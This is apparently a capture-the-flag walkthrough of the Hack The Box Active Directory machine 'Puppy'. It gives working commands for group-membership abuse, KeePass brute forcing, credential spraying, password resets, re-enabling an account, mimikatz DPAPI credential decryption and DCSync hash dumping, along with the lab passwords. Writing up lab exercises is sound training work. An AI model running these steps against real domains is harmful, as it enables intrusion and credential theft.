---
icon: windows
---

# Puppy - Medium

<figure><img src="../../.gitbook/assets/image (2594).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/puppy"><strong>Puppy</strong></a></p></figcaption></figure>

## <mark style="color:blue;">**Gaining Access**</mark>

**Nmap scan:**

```bash
#Nmap TCP
nmap -A -T4 -p- -Pn 10.10.11.70 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-10 14:18 EDT
Nmap scan report for puppy.htb (10.10.11.70)
Host is up (0.039s latency).
Not shown: 65513 filtered tcp ports (no-response)
Bug in iscsi-info: no string output.
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-11 01:24:29Z)
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
3260/tcp  open  iscsi?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc         Microsoft Windows RPC
58251/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m05s
| smb2-time: 
|   date: 2025-10-11T01:26:27
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   51.67 ms 10.10.16.1
2   51.74 ms puppy.htb (10.10.11.70)
```

**We are starting with an assumed breach scenario, using credentials provided for levi.james**

```
levi.james:KingofAkron2025!
```

**Nmap identified the domain name puppy`.htb`.I will add entrie to `/etc/hosts`**

```
10.10.11.70	puppy.htb
```

**Let's see if levi has access to ldap**

```bash
netexec ldap 10.10.11.70 -u levi.james -p KingofAkron2025! --users
```

<figure><img src="../../.gitbook/assets/image (2595).png" alt=""><figcaption></figcaption></figure>

**With access to ldap, I am going to use netexec to do bloodhound collection. We also see that this is the DC machine so I am going to update my `/etc/hosts` file**

```
10.10.11.70	puppy.htb dc.puppy.htb
```

### <mark style="color:blue;">**Bloodhound**</mark>

{% code overflow="wrap" %}
```bash
netexec ldap 10.10.11.70 -u levi.james -p KingofAkron2025! --bloodhound --collection All --dns-server 10.10.11.70
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2596).png" alt=""><figcaption></figcaption></figure>

**Let's start bloodhound and take a look.**

```
sudo neo4j start
bloodhound
```

### <mark style="color:$primary;">**Generic Write on Group**</mark>

<figure><img src="../../.gitbook/assets/image (2597).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2598).png" alt=""><figcaption></figcaption></figure>

**levi is part of the HR Group that has GenericWrite on the Developer Group. This is good information!**&#x20;

**We can write ourselves to that group, I'll use net rpc to get it done**

{% code overflow="wrap" %}
```bash
net rpc group addmem "DEVELOPERS" "levi.james" -U "puppy.htb"/"levi.james"%"KingofAkron2025!" -S "dc.puppy.htb"
```
{% endcode %}

**And now to check if we are part of that group**

{% code overflow="wrap" %}
```bash
net rpc group members "DEVELOPERS" -U "puppy.htb"/"levi.james"%"KingofAkron2025!" -S "dc.puppy.htb"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2600).png" alt=""><figcaption></figcaption></figure>

**Let's see what we have access to now!**

### <mark style="color:$primary;">**SMB Enumeration**</mark>

```bash
netexec smb 10.10.11.70 -u levi.james -p KingofAkron2025! --shares
```

<figure><img src="../../.gitbook/assets/image (2601).png" alt=""><figcaption></figcaption></figure>

**Now we have access to the DEV share, let's check it out**

```bash
smbclient \\\\10.10.11.70\\DEV -U 'levi.james%KingofAkron2025!'
```

<figure><img src="../../.gitbook/assets/image (2602).png" alt=""><figcaption></figcaption></figure>

**Found a password manager file. I am going to download it and try to take a peak at it**

### <mark style="color:$primary;">**Cracking kdbx**</mark>&#x20;

<figure><img src="../../.gitbook/assets/image (2603).png" alt=""><figcaption></figcaption></figure>

**This version is not supported by keepass2john. I had to look for an alternative, this is what I came up with**

{% embed url="https://github.com/r3nt0n/keepass4brute" %}

```bash
./keepass4brute.sh ../recovery.kdbx /usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (2604).png" alt=""><figcaption></figcaption></figure>

**We got our password \[`liverpool`], I am going to use `KeePassXC` to check it out**

<figure><img src="../../.gitbook/assets/image (2606).png" alt=""><figcaption></figcaption></figure>

**We got 5 users and their passwords. I am going to get the usernames via RID cycling save them into a users  file and save the passwords from the database to a passwords file. Then I will try Credential Spraying and see what sticks**

### <mark style="color:$primary;">**RID Cycling**</mark>

{% code overflow="wrap" %}
```bash
netexec smb puppy.htb -u levi.james -p 'KingofAkron2025!' --rid-brute | grep SidTypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2607).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">**Credential Spraying**</mark>

```bash
netexec smb puppy.htb -u users -p passwords --continue-on-success
```

<figure><img src="../../.gitbook/assets/image (2608).png" alt=""><figcaption></figcaption></figure>

**we got credentials for ant.edwards**

```
ant.edwards:Antman2025!
```

### <mark style="color:$primary;">**Generic All**</mark>

<figure><img src="../../.gitbook/assets/image (2609).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2610).png" alt=""><figcaption></figcaption></figure>

**Ant.edwards is in the senior devs group that has genericall over adama.silver. This means we can change Adam.silver password! I'll use `rpcclient` for this**

```bash
rpcclient -U 'ant.edwards%Antman2025!' 10.10.11.70
```

```
setuserinfo2 adam.silver 23 Password123!
```

<figure><img src="../../.gitbook/assets/image (2611).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2612).png" alt=""><figcaption></figcaption></figure>

**We managed to change his password but now we found out that his account is disabled. Which we could have checked in Bloodhound as well**

<figure><img src="../../.gitbook/assets/image (2613).png" alt=""><figcaption></figcaption></figure>

**Or if we do not have access to bloodhound or netexec we could have checked with ldapsearch as well**&#x20;

{% code overflow="wrap" %}
```bash
ldapsearch -x -H ldap://10.10.11.70 -D "ANT.EDWARDS@PUPPY.HTB" -W -b "DC=puppy,DC=htb" "(sAMAccountName=ADAM.SILVER)"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (214).png" alt=""><figcaption></figcaption></figure>

<mark style="color:$info;">**userAccountControl: 66050**</mark>**&#x20;Indicates that the account is disabled**

### <mark style="color:$primary;">**Enable Disabled Account**</mark>

**With `GenericAll` privileges over Adam Silver’s account, we should be able to modify his account settings and enable it. We can do so by modifying the LDAP entries. We can achieve this with `ldapmodify`**

**From our recent ldapsearch we can get this information, which we will need**

<figure><img src="../../.gitbook/assets/image (2593).png" alt=""><figcaption></figcaption></figure>

```bash
ldapmodify -x -H ldap://10.10.11.70 -D "ANT.EDWARDS@PUPPY.HTB" -W << EOF
dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
changetype: modify
replace: userAccountControl
userAccountControl: 66048
EOF
```

<figure><img src="../../.gitbook/assets/image (2614).png" alt=""><figcaption></figcaption></figure>

**Now if we check again the accout will be enabled**

<figure><img src="../../.gitbook/assets/image (2615).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2616).png" alt=""><figcaption></figcaption></figure>

**Adam can winrm to the machine. Let's get a shell as him**

```
evil-winrm -i puppy.htb -u adam.silver -p 'Password123!'
```

<figure><img src="../../.gitbook/assets/image (2618).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">**Privilege Escalation**</mark>

<figure><img src="../../.gitbook/assets/image (2619).png" alt=""><figcaption></figcaption></figure>

**There is a Backups folder in the root directory containing a zip file. I downloaded it to my machine to check it out**

**Inside the `nms-auth-config.xml.bak` file I found some credentials**

<figure><img src="../../.gitbook/assets/image (2620).png" alt=""><figcaption></figcaption></figure>

**This user has winrm capabilities, but does not have any other interesting privileges compared to adam**

```
evil-winrm -i puppy.htb -u steph.cooper -p 'ChefSteph2025!'
```

<figure><img src="../../.gitbook/assets/image (2621).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">**Abusing DPAPI**</mark>&#x20;

**This is a great article on Abusing DPAPI**

{% embed url="https://z3r0th.medium.com/abusing-dpapi-40b76d3ff5eb" %}

**I had to ask google about DPAPI Creds and this is what it gave me**

**DPAPI, or Data Protection API, is a Windows data protection service provided by Microsoft that allows developers to securely store and retrieve sensitive data, such as passwords, cryptographic keys, or other confidential information**

**These files can contain anything, including credentials. These so-called credential blobs are commonly stored as hidden files in “`C:\Users<user>\AppData\Roaming\Microsoft\Credentials`” directory**

<figure><img src="../../.gitbook/assets/image (2622).png" alt=""><figcaption></figcaption></figure>

**These credential blobs are encrypted symmetrically with so-called masterkey. Most of the time, every user has a unique masterkey, which is derived from the hash of this user’s password. These encrypted masterkeys (not cleartext!) are commonly stored as hidden files in “`C:\Users<user>\AppData\Roaming\Microsoft\Protect\<SID>`” directory.**

<figure><img src="../../.gitbook/assets/image (2624).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2623).png" alt=""><figcaption></figcaption></figure>

**I am going to use mimikatz as suggested by the blog earlier to Abuse DPAPI. I am going to transfer mimikatz to the machine**

<figure><img src="../../.gitbook/assets/image (2626).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```powershell
.\mimikatz.exe "dpapi::cred /in:C:\users\steph.cooper\appdata\roaming\microsoft\credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9" "exit"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2627).png" alt=""><figcaption></figcaption></figure>

**The `guidMasterKey` is the encrypted masterkey we saw earlier \[those should match] and the `pbData` is the actual encrypted credential data.**

**We can request a backup masterkey for our user `steph.cooper` from the DC \[in our case this machine] over RPC and decrypt the credential blob with it. Once again, Mimikatz offers this functionality with one simple command.**

{% code overflow="wrap" %}
```powershell
.\mimikatz.exe "dpapi::masterkey /in:C:\users\steph.cooper\appdata\roaming\microsoft\protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407 /rpc" "exit"
```
{% endcode %}

**At the bottom is our cleartext masterkey.**

<figure><img src="../../.gitbook/assets/image (2628).png" alt=""><figcaption></figcaption></figure>

**We can print out again the content of Steph’s credential blob. But now, armed with the cleartext masterkey, we can see decrypted password for user `steph.cooper_adm`.**

{% code overflow="wrap" %}
```powershell
.\mimikatz.exe "dpapi::cred /in:C:\users\steph.cooper\appdata\roaming\microsoft\credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9 /masterkey:d9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84" "exit"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2629).png" alt=""><figcaption></figcaption></figure>

```
steph.cooper_adm:FivethChipOnItsWay2025!
```

{% code overflow="wrap" %}
```bash
evil-winrm -i puppy.htb -u steph.cooper_adm -p 'FivethChipOnItsWay2025!'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2633).png" alt=""><figcaption></figcaption></figure>

steph.cooper\_adm is already an administrator user so we can stop here. If you want to get the administrators account you can follow the below steps

### <mark style="color:$primary;">**DCSync**</mark>&#x20;

**If we check bloodhound we can see that `setph.cooper_adm` has DCSync rights**&#x20;

<figure><img src="../../.gitbook/assets/image (2631).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2630).png" alt=""><figcaption></figcaption></figure>

**This means we can export the hash of all domain users through Dcsync!**

{% code overflow="wrap" %}
```bash
impacket-secretsdump "puppy.htb/steph.cooper_adm:FivethChipOnItsWay2025!"@"10.10.11.70"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2637).png" alt=""><figcaption></figcaption></figure>

Make sure you use the Domain Admin's NTLM HASH not the Local Admin

<figure><img src="../../.gitbook/assets/image (2636).png" alt=""><figcaption></figcaption></figure>

You can also grab it with mimikatz check it out

{% code overflow="wrap" %}
```bash
.\mimikatz.exe "lsadump::dcsync /domain:puppy.htb /user:Administrator" "exit"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2635).png" alt=""><figcaption></figcaption></figure>

